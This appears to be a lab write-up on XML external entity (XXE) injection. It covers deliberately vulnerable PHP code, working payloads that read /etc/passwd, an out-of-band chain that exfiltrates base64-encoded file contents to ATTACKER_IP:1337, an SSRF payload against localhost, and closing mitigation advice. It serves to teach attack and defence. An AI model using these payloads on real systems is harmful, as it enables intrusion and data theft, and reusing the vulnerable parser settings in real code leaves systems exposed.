# XXE Injection

---

## TASK 4: Exploiting XXE - In-Band

In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. Example vulnerable PHP code:

```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
$expandedContent = $doc->getElementsByTagName('name')[0]->textContent;
echo "Thank you, " . $expandedContent . "!";
```

### Payload to disclose `/etc/passwd`:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

---

## TASK 5: Exploiting XXE - Out-of-Band

Out-of-band XXE refers to an XXE vulnerability where the attacker cannot see the server's response directly. Instead, data is exfiltrated via alternative channels like DNS or HTTP requests.

### Example Payload:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload>
<file>&xxe;</file>
</upload>
```

### Steps:

1. Start a Python web server to capture out-of-band requests:

```bash
python3 -m http.server 1337
```

2. Create a DTD file (XXE_exploit.dtd):

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

3. Modify payload to reference the DTD file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/XXE_exploit.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

---

## TASK 6: SSRF + XXE

Server-Side Request Forgery (SSRF) allows attackers to make the server send requests to unintended locations. Combined with XXE, this can scan internal networks or access restricted endpoints.

### Example Payload:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:8080/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

---

## TASK 7: Mitigation

### General Best Practices

- **Disable External Entities and DTDs**: Most XXE vulnerabilities arise from malicious DTDs.
- **Use Less Complex Data Formats**: Consider using simpler data formats like JSON.
- **Allowlist Input Validation**: Validate all incoming data against a strict schema.

### Mitigation Techniques in Popular Languages

- **Java**: Use `DocumentBuilderFactory` and disable DTDs.
- **.NET**: Configure XML readers to ignore DTDs and external entities.
- **PHP**: Disable loading external entities by `libxml`.
- **Python**: Use `defusedxml` library, which is designed to mitigate XML vulnerabilities.

---